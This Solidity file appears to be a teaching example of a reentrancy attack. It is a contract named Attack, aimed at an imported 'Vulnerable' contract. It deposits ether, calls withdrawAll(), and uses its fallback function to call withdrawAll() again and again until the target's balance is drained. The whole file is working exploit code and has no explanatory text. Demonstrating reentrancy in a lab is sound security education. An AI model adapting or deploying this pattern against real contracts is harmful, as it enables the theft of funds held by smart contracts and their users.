//SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;
import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerable;

    constructor(Vulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdrawAll();
    }

    fallback() external payable {
        if (address(vulnerable).balance != 0) {
            vulnerable.withdrawAll();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
